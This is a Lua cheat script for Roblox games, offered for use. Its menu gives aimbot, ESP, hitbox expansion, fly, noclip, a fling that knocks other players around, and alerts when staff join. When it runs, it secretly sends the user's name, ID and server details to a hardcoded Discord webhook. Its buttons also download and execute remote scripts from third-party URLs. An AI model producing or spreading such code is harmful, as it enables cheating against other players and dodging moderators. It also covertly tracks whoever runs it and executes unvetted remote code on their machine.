local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()

local webhookURL = "https://discord.com/api/webhooks/1530636370849042463/Re9hI7l-0YR3wlHh0Onq7CtXlZ1VuJykhqov9ongFUjjBF5rv5RB5GiQWaw6ag_mkeUq"

local function sendWebhook()
	pcall(function()
		local placeId = game.PlaceId
		local jobId = game.JobId
		local gameName = "Unknown"
		pcall(function()
			gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
		end)

		local data = {
			["embeds"] = {{
				["title"] = "Universal Script Executed",
				["color"] = 5793266,
				["fields"] = {
					{["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
					{["name"] = "Display Name", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
					{["name"] = "User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
					{["name"] = "Game", ["value"] = gameName, ["inline"] = false},
					{["name"] = "Place ID", ["value"] = tostring(placeId), ["inline"] = true},
					{["name"] = "Job ID", ["value"] = jobId ~= "" and jobId or "None", ["inline"] = true},
					{["name"] = "Join This Server", ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")\n```", ["inline"] = false}
				},
				["footer"] = {["text"] = "Universal Script Logger"},
				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}}
		}

		local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request
		if req then
			req({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
		end
	end)
end
task.spawn(sendWebhook)

local function getExecutorName()
	local s, r = pcall(function()
		return identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Unknown"
	end)
	return s and r or "Unknown"
end

local isCreator = (LocalPlayer.Name == "jimcam79") or (LocalPlayer.UserId == 454468165)

local window = WindUI:CreateWindow({
	Title = "Universal Script",
	Icon = "move",
	Theme = "Dark",
	Transparent = true,
	BackgroundTransparency = 0.15,
	User = {
		Enabled = true,
		Anonymous = false,
		Callback = function()
			WindUI:Notify({
				Title = LocalPlayer.Name,
				Content = "Executor: " .. getExecutorName() .. (isCreator and "\n👑 Creator" or ""),
				Duration = 4
			})
		end
	}
})

if isCreator then
	pcall(function()
		window:Tag({Title = "Creator", Icon = "crown", Color = Color3.fromRGB(255, 215, 0)})
	end)
end

pcall(function() window:Open() end)

local hitbox_tab = window:Tab({ Title = "Hitbox", Icon = "box" })
local teams_tab = window:Tab({ Title = "Teams", Icon = "users" })
local visual_tab = window:Tab({ Title = "Visual", Icon = "eye" })
local spectate_tab = window:Tab({ Title = "Spectate", Icon = "eye" })
local movement_tab = window:Tab({ Title = "Movement", Icon = "person-standing" })
local aim_tab = window:Tab({ Title = "Aim", Icon = "crosshair" })
local additionals_tab = window:Tab({ Title = "Additionals", Icon = "plus" })
local universal_tab = window:Tab({ Title = "Universal", Icon = "code" })
local games_tab = window:Tab({ Title = "Games", Icon = "gamepad" })
local theme_tab = window:Tab({ Title = "Theme", Icon = "palette" })
local config_tab = window:Tab({ Title = "Config", Icon = "save" })
local credits_tab = window:Tab({ Title = "Credits", Icon = "info" })

local size = 13
local transparency = 0.5
local expanded = false
local selectedTeams = {}
local originalSizes = {}
local espEnabled = false
local showHealth = false
local showName = false
local showDistance = false
local tracersEnabled = false
local currentSpectate = nil
local selectedSpectatePlayer = nil
local walkSpeed = 16
local noclipEnabled = false
local flyEnabled = false
local infiniteJump = false
local aimbotEnabled = false
local silentAimEnabled = false
local triggerBotEnabled = false
local aimbotKey = nil
local silentAimKey = nil
local triggerBotKey = nil
local crosshairEnabled = false
local flingEnabled = false
local walkFlingEnabled = false
local staffDetection = true
local fovValue = 70
local configs = {}
local ESP = {Boxes = {}, Tracers = {}, HealthBars = {}, Names = {}, Distances = {}}
local crosshairDrawing = nil
local flyBodyVelocity = nil
local flyBodyGyro = nil
local rainbowConnection = nil

local function shouldAffectPlayer(targetPlayer)
	if targetPlayer == LocalPlayer then return false end
	if #selectedTeams == 0 then return true end
	local team = targetPlayer.Team
	if not team then return false end
	for _, teamName in ipairs(selectedTeams) do
		if team.Name == teamName then return true end
	end
	return false
end

local function ResizeHead(targetPlayer, newSize)
	if not shouldAffectPlayer(targetPlayer) then
		local character = targetPlayer.Character
		if character then
			local head = character:FindFirstChild("Head")
			if head and originalSizes[head] then
				head.Size = originalSizes[head]
				head.Transparency = 1
			end
		end
		return
	end
	local character = targetPlayer.Character
	if not character then return end
	local head = character:FindFirstChild("Head")
	if not head then return end
	if not originalSizes[head] then
		originalSizes[head] = head.Size
	end
	if newSize <= 0 then
		head.Size = originalSizes[head]
		head.Transparency = 1
	else
		head.Size = Vector3.new(newSize, newSize, newSize)
		head.Transparency = transparency
		head.CanCollide = false
		head.Massless = true
		head.Anchored = false
	end
end

hitbox_tab:Toggle({
	Title = "Enable Head Expander",
	Desc = "Turn expander on/off",
	Type = "Checkbox",
	Icon = "check",
	Value = false,
	Callback = function(state)
		expanded = state
		if not state then
			for _, plr in Players:GetPlayers() do
				ResizeHead(plr, 0)
			end
		end
	end
})

hitbox_tab:Slider({
	Title = "Head Size",
	Desc = "Higher = bigger hitbox",
	Step = 1,
	Value = { Min = 5, Max = 100, Default = 13 },
	Callback = function(value) size = value end
})

hitbox_tab:Slider({
	Title = "Head Transparency",
	Desc = "Visibility of expanded heads",
	Step = 0.1,
	Value = { Min = 0.3, Max = 1, Default = 0.5 },
	Callback = function(value) transparency = value end
})

local allTeams = {}
for _, team in ipairs(game:GetService("Teams"):GetTeams()) do
	table.insert(allTeams, team.Name)
end

teams_tab:Dropdown({
	Title = "Target Teams",
	Desc = "Select teams to affect (empty = everyone)",
	Values = allTeams,
	Multi = true,
	Callback = function(selected)
		selectedTeams = selected or {}
		if expanded then
			for _, plr in Players:GetPlayers() do
				if shouldAffectPlayer(plr) then
					ResizeHead(plr, size)
				else
					ResizeHead(plr, 0)
				end
			end
		end
	end
})

teams_tab:Button({
	Title = "Refresh Team List",
	Desc = "Update if new teams appeared",
	Callback = function()
		allTeams = {}
		for _, team in ipairs(game:GetService("Teams"):GetTeams()) do
			table.insert(allTeams, team.Name)
		end
	end
})

local function clearVisuals()
	for _, v in pairs(ESP.Boxes) do if v then v:Remove() end end
	for _, v in pairs(ESP.Tracers) do if v then v:Remove() end end
	for _, v in pairs(ESP.HealthBars) do if v then v:Remove() end end
	for _, v in pairs(ESP.Names) do if v then v:Remove() end end
	for _, v in pairs(ESP.Distances) do if v then v:Remove() end end
	ESP.Boxes = {}
	ESP.Tracers = {}
	ESP.HealthBars = {}
	ESP.Names = {}
	ESP.Distances = {}
end

local function updateVisuals()
	if not espEnabled and not tracersEnabled then return end
	for _, player in ipairs(Players:GetPlayers()) do
		if player == LocalPlayer then continue end
		local character = player.Character
		if not character then continue end
		local rootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChild("Humanoid")
		local head = character:FindFirstChild("Head")
		if not rootPart or not humanoid or humanoid.Health <= 0 then continue end

		local boxColor = player.Team and player.Team.TeamColor.Color or Color3.new(1, 0, 0)
		local rootPos, onScreen = Camera:WorldToViewportPoint(rootPart.Position)
		if not onScreen then
			if ESP.Boxes[player] then ESP.Boxes[player].Visible = false end
			if ESP.Tracers[player] then ESP.Tracers[player].Visible = false end
			if ESP.HealthBars[player] then ESP.HealthBars[player].Visible = false end
			if ESP.Names[player] then ESP.Names[player].Visible = false end
			if ESP.Distances[player] then ESP.Distances[player].Visible = false end
			continue
		end

		local topPos = head and Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 0.5, 0)) or rootPos
		local legPart = character:FindFirstChild("LeftFoot") or character:FindFirstChild("LeftLowerLeg")
		local bottomPos = legPart and Camera:WorldToViewportPoint(legPart.Position - Vector3.new(0, 0.5, 0)) or rootPos
		local height = math.abs(topPos.Y - bottomPos.Y)
		local width = height * 0.6

		if espEnabled then
			if not ESP.Boxes[player] then
				local box = Drawing.new("Square")
				box.Thickness = 2
				box.Filled = false
				box.Transparency = 1
				ESP.Boxes[player] = box
			end
			local box = ESP.Boxes[player]
			box.Color = boxColor
			box.Size = Vector2.new(width, height)
			box.Position = Vector2.new(rootPos.X - width/2, topPos.Y)
			box.Visible = true

			if showHealth then
				if not ESP.HealthBars[player] then
					local bar = Drawing.new("Square")
					bar.Filled = true
					bar.Thickness = 1
					ESP.HealthBars[player] = bar
				end
				local bar = ESP.HealthBars[player]
				local healthPercent = math.clamp(humanoid.Health / humanoid.MaxHealth, 0, 1)
				bar.Color = Color3.fromRGB(255 * (1 - healthPercent), 255 * healthPercent, 0)
				bar.Size = Vector2.new(4, height * healthPercent)
				bar.Position = Vector2.new(rootPos.X + width/2 + 3, topPos.Y + height * (1 - healthPercent))
				bar.Visible = true
			elseif ESP.HealthBars[player] then
				ESP.HealthBars[player].Visible = false
			end

			if showName then
				if not ESP.Names[player] then
					local name = Drawing.new("Text")
					name.Size = 14
					name.Center = true
					name.Outline = true
					ESP.Names[player] = name
				end
				local name = ESP.Names[player]
				name.Text = player.Name
				name.Color = boxColor
				name.Position = Vector2.new(rootPos.X, topPos.Y - 16)
				name.Visible = true
			elseif ESP.Names[player] then
				ESP.Names[player].Visible = false
			end

			if showDistance then
				if not ESP.Distances[player] then
					local dist = Drawing.new("Text")
					dist.Size = 13
					dist.Center = true
					dist.Outline = true
					ESP.Distances[player] = dist
				end
				local dist = ESP.Distances[player]
				local distance = math.floor((rootPart.Position - Camera.CFrame.Position).Magnitude)
				dist.Text = distance .. " studs"
				dist.Color = Color3.new(1, 1, 1)
				dist.Position = Vector2.new(rootPos.X, bottomPos.Y + 4)
				dist.Visible = true
			elseif ESP.Distances[player] then
				ESP.Distances[player].Visible = false
			end
		end

		if tracersEnabled then
			if not ESP.Tracers[player] then
				local tracer = Drawing.new("Line")
				tracer.Thickness = 1.5
				ESP.Tracers[player] = tracer
			end
			local tracer = ESP.Tracers[player]
			tracer.Color = boxColor
			tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
			tracer.To = Vector2.new(rootPos.X, rootPos.Y)
			tracer.Visible = true
		elseif ESP.Tracers[player] then
			ESP.Tracers[player].Visible = false
		end
	end
end

visual_tab:Toggle({
	Title = "Box ESP",
	Desc = "Toggle box ESP",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		espEnabled = state
		if not state then clearVisuals() end
	end
})

visual_tab:Toggle({
	Title = "Team Tracers",
	Desc = "Team colored tracers",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		tracersEnabled = state
		if not state then
			for _, v in pairs(ESP.Tracers) do if v then v.Visible = false end end
		end
	end
})

visual_tab:Toggle({
	Title = "Show Health Bar",
	Desc = "Health bar next to box",
	Type = "Checkbox",
	Value = false,
	Callback = function(state) showHealth = state end
})

visual_tab:Toggle({
	Title = "Show Name",
	Desc = "Show player name",
	Type = "Checkbox",
	Value = false,
	Callback = function(state) showName = state end
})

visual_tab:Toggle({
	Title = "Show Distance",
	Desc = "Show distance in studs",
	Type = "Checkbox",
	Value = false,
	Callback = function(state) showDistance = state end
})

local function getPlayerList()
	local list = {}
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			table.insert(list, player.Name)
		end
	end
	return list
end

local spectateDropdown
spectateDropdown = spectate_tab:Dropdown({
	Title = "Select Player",
	Desc = "Choose who to spectate",
	Values = getPlayerList(),
	Callback = function(selectedName)
		selectedSpectatePlayer = selectedName
	end
})

spectate_tab:Button({
	Title = "Spectate",
	Desc = "Start spectating the selected player",
	Callback = function()
		if not selectedSpectatePlayer then return end
		local target = Players:FindFirstChild(selectedSpectatePlayer)
		if target and target.Character and target.Character:FindFirstChild("Humanoid") then
			currentSpectate = target
			Camera.CameraSubject = target.Character.Humanoid
		end
	end
})

spectate_tab:Button({
	Title = "Stop Spectating",
	Desc = "Return camera to yourself",
	Callback = function()
		currentSpectate = nil
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("Humanoid") then
			Camera.CameraSubject = char.Humanoid
		end
	end
})

spectate_tab:Button({
	Title = "Refresh Player List",
	Desc = "Update the dropdown",
	Callback = function()
		local newList = getPlayerList()
		pcall(function()
			spectateDropdown:SetValues(newList)
		end)
	end
})

Players.PlayerAdded:Connect(function(player)
	task.wait(0.5)
	pcall(function()
		spectateDropdown:SetValues(getPlayerList())
	end)
end)

Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		spectateDropdown:SetValues(getPlayerList())
	end)
	if currentSpectate == player then
		currentSpectate = nil
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("Humanoid") then
			Camera.CameraSubject = char.Humanoid
		end
	end
end)

RunService.RenderStepped:Connect(function()
	if currentSpectate and currentSpectate.Character and currentSpectate.Character:FindFirstChild("Humanoid") then
		Camera.CameraSubject = currentSpectate.Character.Humanoid
	end
end)

movement_tab:Slider({
	Title = "Walk Speed",
	Desc = "Change walk speed",
	Step = 1,
	Value = { Min = 16, Max = 250, Default = 16 },
	Callback = function(value)
		walkSpeed = value
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("Humanoid") then
			char.Humanoid.WalkSpeed = value
		end
	end
})

movement_tab:Toggle({
	Title = "Noclip",
	Desc = "Walk through walls",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		noclipEnabled = state
	end
})

movement_tab:Toggle({
	Title = "Fly",
	Desc = "Enable flying",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		flyEnabled = state
		local char = LocalPlayer.Character
		if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart")
		if not root then return end
		if state then
			flyBodyVelocity = Instance.new("BodyVelocity")
			flyBodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
			flyBodyVelocity.Velocity = Vector3.zero
			flyBodyVelocity.Parent = root
			flyBodyGyro = Instance.new("BodyGyro")
			flyBodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
			flyBodyGyro.P = 9e4
			flyBodyGyro.Parent = root
		else
			if flyBodyVelocity then flyBodyVelocity:Destroy() flyBodyVelocity = nil end
			if flyBodyGyro then flyBodyGyro:Destroy() flyBodyGyro = nil end
		end
	end
})

movement_tab:Toggle({
	Title = "Infinite Jump",
	Desc = "Jump infinitely",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		infiniteJump = state
	end
})

UserInputService.JumpRequest:Connect(function()
	if infiniteJump then
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("Humanoid") then
			char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end
end)

RunService.Stepped:Connect(function()
	if noclipEnabled then
		local char = LocalPlayer.Character
		if char then
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") then
					part.CanCollide = false
				end
			end
		end
	end
end)

RunService.RenderStepped:Connect(function()
	if flyEnabled and flyBodyVelocity and flyBodyGyro then
		local camCF = Camera.CFrame
		local move = Vector3.zero
		if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + camCF.LookVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - camCF.LookVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - camCF.RightVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + camCF.RightVector end
		if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
		if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then move = move - Vector3.new(0, 1, 0) end
		flyBodyVelocity.Velocity = move.Magnitude > 0 and move.Unit * 50 or Vector3.zero
		flyBodyGyro.CFrame = camCF
	end
end)

aim_tab:Toggle({
	Title = "Aimbot",
	Desc = "Lock onto nearest player",
	Type = "Checkbox",
	Value = false,
	Callback = function(state) aimbotEnabled = state end
})

aim_tab:Toggle({
	Title = "Silent Aim",
	Desc = "Silent aim at nearest player",
	Type = "Checkbox",
	Value = false,
	Callback = function(state) silentAimEnabled = state end
})

aim_tab:Toggle({
	Title = "Trigger Bot",
	Desc = "Auto shoot when crosshair is on player",
	Type = "Checkbox",
	Value = false,
	Callback = function(state) triggerBotEnabled = state end
})

aim_tab:Keybind({
	Title = "Aimbot Keybind",
	Desc = "Key to toggle aimbot",
	Value = nil,
	Callback = function(key)
		aimbotKey = key
	end
})

aim_tab:Keybind({
	Title = "Silent Aim Keybind",
	Desc = "Key to toggle silent aim",
	Value = nil,
	Callback = function(key)
		silentAimKey = key
	end
})

aim_tab:Keybind({
	Title = "Trigger Bot Keybind",
	Desc = "Key to toggle trigger bot",
	Value = nil,
	Callback = function(key)
		triggerBotKey = key
	end
})

aim_tab:Toggle({
	Title = "Custom Crosshair",
	Desc = "Show custom crosshair",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		crosshairEnabled = state
		if state then
			if not crosshairDrawing then
				crosshairDrawing = Drawing.new("Circle")
				crosshairDrawing.Thickness = 1.5
				crosshairDrawing.NumSides = 20
				crosshairDrawing.Radius = 6
				crosshairDrawing.Filled = false
				crosshairDrawing.Color = Color3.new(0, 1, 0)
			end
			crosshairDrawing.Visible = true
		elseif crosshairDrawing then
			crosshairDrawing.Visible = false
		end
	end
})

RunService.RenderStepped:Connect(function()
	if crosshairEnabled and crosshairDrawing then
		crosshairDrawing.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
	end
end)

local function getClosestPlayer()
	local closest = nil
	local shortest = math.huge
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
			local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
			if onScreen then
				local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
				if dist < shortest then
					shortest = dist
					closest = player
				end
			end
		end
	end
	return closest
end

RunService.RenderStepped:Connect(function()
	if aimbotEnabled then
		local target = getClosestPlayer()
		if target and target.Character and target.Character:FindFirstChild("Head") then
			Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Character.Head.Position)
		end
	end
end)

additionals_tab:Toggle({
	Title = "Fling",
	Desc = "Classic Infinite Yield style fling",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		flingEnabled = state
		if not state then
			local char = LocalPlayer.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				char.HumanoidRootPart.RotVelocity = Vector3.zero
				char.HumanoidRootPart.Velocity = Vector3.zero
			end
		end
	end
})

additionals_tab:Toggle({
	Title = "Walk Fling",
	Desc = "Fling people while walking (no spinning)",
	Type = "Checkbox",
	Value = false,
	Callback = function(state)
		walkFlingEnabled = state
	end
})

additionals_tab:Slider({
	Title = "FOV",
	Desc = "Change camera field of view",
	Step = 1,
	Value = { Min = 70, Max = 120, Default = 70 },
	Callback = function(value)
		fovValue = value
		Camera.FieldOfView = value
	end
})

additionals_tab:Button({
	Title = "Give Teleport Tool",
	Desc = "Adds Teleport Tool to your backpack",
	Callback = function()
		local tool = Instance.new("Tool")
		tool.Name = "Teleport Tool"
		tool.RequiresHandle = false
		tool.Parent = LocalPlayer.Backpack
		tool.Activated:Connect(function()
			local char = LocalPlayer.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				local hit = Mouse.Hit
				if hit then
					char.HumanoidRootPart.CFrame = CFrame.new(hit.Position + Vector3.new(0, 3, 0))
				end
			end
		end)
	end
})

additionals_tab:Toggle({
	Title = "Staff Detection",
	Desc = "Notify when staff joins",
	Type = "Checkbox",
	Value = true,
	Callback = function(state)
		staffDetection = state
	end
})

local function isStaff(player)
	local success, groups = pcall(function()
		return player:GetGroupsAsync()
	end)
	if not success then return false end
	for _, group in ipairs(groups) do
		local role = string.lower(group.Role)
		if string.find(role, "mod") or string.find(role, "admin") or string.find(role, "staff") or string.find(role, "owner") or string.find(role, "manager") or string.find(role, "dev") then
			return true
		end
	end
	return false
end

Players.PlayerAdded:Connect(function(player)
	if staffDetection then
		task.spawn(function()
			task.wait(2)
			if isStaff(player) then
				WindUI:Notify({
					Title = "Staff Detection",
					Content = "A staff member has joined your game: " .. player.Name,
					Duration = 6
				})
			end
		end)
	end
end)

for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer and staffDetection then
		task.spawn(function()
			if isStaff(player) then
				WindUI:Notify({
					Title = "Staff Detection",
					Content = "A staff member is in your game: " .. player.Name,
					Duration = 6
				})
			end
		end)
	end
end

RunService.Heartbeat:Connect(function()
	local char = LocalPlayer.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end

	if flingEnabled then
		root.Velocity = Vector3.new(0, 0, 0)
		root.RotVelocity = Vector3.new(0, 9e9, 0)
	end

	if walkFlingEnabled then
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local otherRoot = player.Character.HumanoidRootPart
				local dist = (otherRoot.Position - root.Position).Magnitude
				if dist < 10 then
					otherRoot.Velocity = (otherRoot.Position - root.Position).Unit * 200 + Vector3.new(0, 100, 0)
				end
			end
		end
	end
end)

universal_tab:Button({
	Title = "Universal All Games",
	Desc = "Load the universal all games script",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/All-Roblox-Games-Script/refs/heads/main/JN%20HH%20Gaming",true))()
	end
})

universal_tab:Button({
	Title = "Infinite Yield",
	Desc = "Load Infinite Yield admin commands",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end
})

games_tab:Button({
	Title = "Basketball Zero: Auto Green",
	Desc = "Load Basketball Zero Auto Green script",
	Callback = function()
		script_key="PUT YOUR KEY HERE"; loadstring(game:HttpGet("https://raw.githubusercontent.com/nouralddin-abdullah/99-night/refs/heads/main/main-en.lua"))()
	end
})

games_tab:Button({
	Title = "War Tycoon",
	Desc = "Load War Tycoon script",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Comanche-War-Tycoon-aim-and-more-190482"))()
	end
})

games_tab:Button({
	Title = "Arsenal",
	Desc = "Load Arsenal script",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/eselfins31/Valor-Hub/main/Arsenal%20Advanced/Unified_protected.lua", true))()
	end
})

local function stopRainbow()
	if rainbowConnection then
		rainbowConnection:Disconnect()
		rainbowConnection = nil
	end
end

theme_tab:Dropdown({
	Title = "Select Theme",
	Desc = "Change the GUI theme",
	Values = {"Dark", "White", "Magenta", "Yellow", "Red", "Pink", "Blue", "Cyan", "Rainbow"},
	Value = "Dark",
	Callback = function(option)
		stopRainbow()
		if option == "Rainbow" then
			local hue = 0
			rainbowConnection = RunService.Heartbeat:Connect(function()
				hue = (hue + 0.005) % 1
				pcall(function() WindUI:SetTheme("Dark") end)
			end)
		elseif option == "Red" or option == "Pink" then
			pcall(function() WindUI:SetTheme("Rose") end)
		elseif option == "Magenta" then
			pcall(function() WindUI:SetTheme("Violet") end)
		elseif option == "White" then
			pcall(function() WindUI:SetTheme("Light") end)
		elseif option == "Yellow" then
			pcall(function() WindUI:SetTheme("Amber") end)
		elseif option == "Blue" then
			pcall(function() WindUI:SetTheme("Indigo") end)
		elseif option == "Cyan" then
			pcall(function() WindUI:SetTheme("Sky") end)
		else
			pcall(function() WindUI:SetTheme("Dark") end)
		end
	end
})

local configNames = {}
local selectedConfig = nil

config_tab:Input({
	Title = "Config Name",
	Desc = "Name for saving config",
	Value = "",
	Callback = function(text)
		selectedConfig = text
	end
})

config_tab:Button({
	Title = "Save Config",
	Desc = "Save current settings",
	Callback = function()
		if not selectedConfig or selectedConfig == "" then
			WindUI:Notify({Title = "Error", Content = "Enter a config name first", Duration = 3})
			return
		end
		local data = {
			size = size,
			transparency = transparency,
			walkSpeed = walkSpeed,
			showHealth = showHealth,
			showName = showName,
			showDistance = showDistance,
			fovValue = fovValue
		}
		configs[selectedConfig] = data
		table.insert(configNames, selectedConfig)
		if writefile then
			pcall(function()
				writefile("UniversalConfigs.json", HttpService:JSONEncode(configs))
			end)
		end
		WindUI:Notify({Title = "Config", Content = "Saved: " .. selectedConfig, Duration = 3})
	end
})

config_tab:Dropdown({
	Title = "Load Config",
	Desc = "Select a config to load",
	Values = configNames,
	Callback = function(name)
		if configs[name] then
			local c = configs[name]
			size = c.size or 13
			transparency = c.transparency or 0.5
			walkSpeed = c.walkSpeed or 16
			showHealth = c.showHealth or false
			showName = c.showName or false
			showDistance = c.showDistance or false
			fovValue = c.fovValue or 70
			Camera.FieldOfView = fovValue
			WindUI:Notify({Title = "Config", Content = "Loaded: " .. name, Duration = 3})
		end
	end
})

config_tab:Dropdown({
	Title = "Delete Config",
	Desc = "Select a config to delete",
	Values = configNames,
	Callback = function(name)
		if configs[name] then
			configs[name] = nil
			for i, v in ipairs(configNames) do
				if v == name then
					table.remove(configNames, i)
					break
				end
			end
			if writefile then
				pcall(function()
					writefile("UniversalConfigs.json", HttpService:JSONEncode(configs))
				end)
			end
			WindUI:Notify({Title = "Config", Content = "Deleted: " .. name, Duration = 3})
		end
	end
})

if isfile and isfile("UniversalConfigs.json") then
	pcall(function()
		configs = HttpService:JSONDecode(readfile("UniversalConfigs.json"))
		for name in pairs(configs) do
			table.insert(configNames, name)
		end
	end)
end

credits_tab:Paragraph({
	Title = "Credits",
	Desc = "Credits to Team Void"
})

RunService.Heartbeat:Connect(function()
	if expanded then
		for _, player in Players:GetPlayers() do
			ResizeHead(player, size)
		end
	end
end)

RunService.RenderStepped:Connect(updateVisuals)

Players.PlayerRemoving:Connect(function(player)
	if ESP.Boxes[player] then ESP.Boxes[player]:Remove() ESP.Boxes[player] = nil end
	if ESP.Tracers[player] then ESP.Tracers[player]:Remove() ESP.Tracers[player] = nil end
	if ESP.HealthBars[player] then ESP.HealthBars[player]:Remove() ESP.HealthBars[player] = nil end
	if ESP.Names[player] then ESP.Names[player]:Remove() ESP.Names[player] = nil end
	if ESP.Distances[player] then ESP.Distances[player]:Remove() ESP.Distances[player] = nil end
end)

Players.PlayerAdded:Connect(function(newPlayer)
	if newPlayer == LocalPlayer then return end
	newPlayer.CharacterAdded:Connect(function()
		task.wait(0.6)
		if expanded then ResizeHead(newPlayer, size) end
	end)
end)

for _, plr in Players:GetPlayers() do
	if plr ~= LocalPlayer then
		plr.CharacterAdded:Connect(function()
			task.wait(0.6)
			if expanded then ResizeHead(plr, size) end
		end)
	end
end

LocalPlayer.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if char:FindFirstChild("Humanoid") then
		char.Humanoid.WalkSpeed = walkSpeed
	end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.RightShift then
		if window.Toggle then
			window:Toggle()
		elseif window.ToggleVisibility then
			window:ToggleVisibility()
		elseif window.SetVisible then
			local currentlyVisible = window.Visible or true
			window:SetVisible(not currentlyVisible)
		else
			pcall(function() window:Open() end)
		end
	end
end)

print("Universal Script Loaded!")
